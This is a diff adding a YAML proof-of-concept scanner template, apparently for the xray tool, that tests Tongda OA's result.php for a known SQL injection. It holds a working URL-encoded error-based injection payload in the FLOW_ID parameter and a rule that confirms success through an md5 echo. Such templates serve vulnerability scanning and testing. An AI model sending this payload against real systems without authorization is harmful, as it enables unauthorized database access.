@@ -1,0 +1,13 @@
+name: poc-yaml-tongda-wooyun-2015-0116359-sqli
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: GET
+    path: >-
+      /general/score/flow/scoredate/result.php?FLOW_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5({{rand}})%20from%20user%20limit%201),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23
+    expression: |
+      response.body.bcontains(bytes(md5(string(rand))))
+detail:
+  author: 1C(https://www.bugku.net)
+  links:
+    - https://www.seebug.org/vuldb/ssvid-96096
